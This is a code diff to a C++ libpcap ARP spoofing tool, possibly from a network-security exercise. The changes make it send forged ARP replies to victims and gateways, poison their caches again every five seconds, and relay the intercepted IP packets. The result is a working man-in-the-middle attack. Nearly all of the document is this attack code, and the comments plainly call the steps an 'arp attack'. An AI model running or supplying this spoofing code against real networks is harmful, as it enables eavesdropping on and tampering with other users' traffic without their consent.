@@ -45,7 +45,7 @@ Ip getIpAddress(const char* iface) {
     return Ip(ntohl(((struct sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));
 }
 
-void sendArp(pcap_t* pcap, Mac eth_smac, Mac eth_dmac, Ip sip, Ip dip, Mac arp_smac, Mac arp_dmac){
+void sendArp(pcap_t* pcap, Mac eth_smac, Mac eth_dmac, Ip sip, Ip dip, Mac arp_smac, Mac arp_dmac, uint16_t op){
     EthArpPacket packet;
 
     packet.eth_.dmac_ = eth_dmac;
@@ -56,7 +56,7 @@ void sendArp(pcap_t* pcap, Mac eth_smac, Mac eth_dmac, Ip sip, Ip dip, Mac arp_s
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
     packet.arp_.pln_ = Ip::SIZE;
-    packet.arp_.op_ = htons(ArpHdr::Request);
+    packet.arp_.op_ = htons(op);
     packet.arp_.smac_ = arp_smac;
     packet.arp_.sip_ = htonl(sip);
     packet.arp_.tmac_ = arp_dmac;
@@ -82,7 +82,7 @@ void replayPacket(pcap_t* pcap, const struct pcap_pkthdr* header, const u_char* 
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
             }
         }
-        if(smac == tmacVec[i] && tmac == my_mac){
+        else if(smac == tmacVec[i] && tmac == my_mac){
             ethHdr->smac_ = my_mac;
             ethHdr->dmac_ = smacVec[i];
             int res = pcap_sendpacket(pcap, packet, header->caplen);
@@ -119,16 +119,15 @@ int main(int argc, char* argv[]) {
         Ip sip = Ip(argv[i]);
         Ip tip = Ip(argv[i+1]);
 
-        sendArp(pcap, my_mac, Mac::broadcastMac(), my_ip, sip, my_mac, Mac::nullMac());
-        sendArp(pcap, my_mac, Mac::broadcastMac(), my_ip, tip, my_mac, Mac::nullMac());
+        sendArp(pcap, my_mac, Mac::broadcastMac(), my_ip, sip, my_mac, Mac::nullMac(), ArpHdr::Request);
+        sendArp(pcap, my_mac, Mac::broadcastMac(), my_ip, tip, my_mac, Mac::nullMac(), ArpHdr::Request);
         ipVec.push_back(std::pair(sip, tip));
     }
 
-    // Ip sip = Ip(argv[2]);
-    // Ip tip = Ip(argv[3]);
-
     std::vector<Mac> smacVec(ipVec.size());
     std::vector<Mac> tmacVec(ipVec.size());
+
+    time_t lastSpoofTime = 0;
 
     while(true){
         struct pcap_pkthdr* header;
@@ -150,24 +149,19 @@ int main(int argc, char* argv[]) {
                     // get victim's MAC address
                     if(arpHdr->tip() == my_ip){
                         smacVec[i] = arpHdr->smac();
+                        // send initial arp attack to victim
+                        sendArp(pcap, my_mac, smacVec[i], ipVec[i].second, ipVec[i].first, my_mac, smacVec[i],ArpHdr::Reply);
                         std::cout << "Sender MAC: " << std::string(smacVec[i]) << std::endl;
                     }
-                    else if(arpHdr->op() != htons(ArpHdr::Request) || arpHdr->tip() != ipVec[i].second) continue;
-
-                    // send arp attack to victim
-                    sendArp(pcap, my_mac, smacVec[i], ipVec[i].second, ipVec[i].first, my_mac, smacVec[i]);
-                    std::cout<<"yes"<<std::endl;
                 }
                 else if(arpHdr->sip() == ipVec[i].second){
                     // get gateway's MAC address
                     if(arpHdr->tip() == my_ip){
                         tmacVec[i] = arpHdr->smac();
+                         //send arp attack to target
+                        sendArp(pcap, my_mac, tmacVec[i], ipVec[i].first, ipVec[i].second , my_mac, tmacVec[i],ArpHdr::Reply);
                         std::cout << "Target MAC: " << std::string(tmacVec[i]) << std::endl;
                     }
-                    else if(arpHdr->op() != htons(ArpHdr::Request) || arpHdr->tip() != ipVec[i].first) continue;
-
-                    //send arp attack to target
-                    sendArp(pcap, my_mac, tmacVec[i], ipVec[i].first, ipVec[i].second , my_mac, tmacVec[i]);
                 }
             }
         }
@@ -175,6 +169,17 @@ int main(int argc, char* argv[]) {
         // replay
         else if(ethHdr->type() == EthHdr::Ip4){
             replayPacket(pcap, header, reply_packet, my_mac, smacVec, tmacVec);
+        }
+
+        //re-attack every 5 seconds
+        if (time(nullptr) - lastSpoofTime > 5) {
+            for (int i = 0; i < ipVec.size(); i++) {
+                if (smacVec[i] != Mac() && tmacVec[i] != Mac()) {
+                    sendArp(pcap, my_mac, smacVec[i], ipVec[i].second, ipVec[i].first, my_mac, smacVec[i], ArpHdr::Reply);
+                    sendArp(pcap, my_mac, tmacVec[i], ipVec[i].first, ipVec[i].second, my_mac, tmacVec[i], ArpHdr::Reply);
+                }
+            }
+            lastSpoofTime = time(nullptr);
         }
     }
 
